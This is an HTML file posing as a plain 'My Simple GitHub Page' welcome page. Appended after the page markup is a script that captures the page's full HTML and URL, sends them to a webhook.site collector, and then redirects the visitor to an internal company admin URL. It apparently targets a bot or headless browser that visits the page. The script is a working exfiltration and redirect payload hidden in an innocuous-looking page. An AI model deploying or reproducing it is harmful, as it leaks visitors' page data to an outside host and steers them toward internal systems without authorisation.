<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Simple GitHub Page</title>
</head>
<body>
    <h1>Welcome to My Website!</h1>
    <p>This page is hosted entirely on GitHub Pages.</p>
</body>
</html>

<script>
// 1. First, capture the HTML content of the current page
const htmlContent = document.documentElement.outerHTML;

// 2. Send the captured data to your webhook
fetch('https://webhook.site/f6db471c-032a-4816-9df7-7e77adf14368', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    url: window.location.href,
    html: htmlContent
  })
})
.then(response => {
  console.log('Webhook sent successfully. Redirecting now...');
  // 3. Only redirect AFTER the webhook confirms receipt
  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
})
.catch(error => {
  console.error('Error posting to webhook:', error);
  // Optional: Redirect anyway if the webhook fails
  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
});

    
</script>
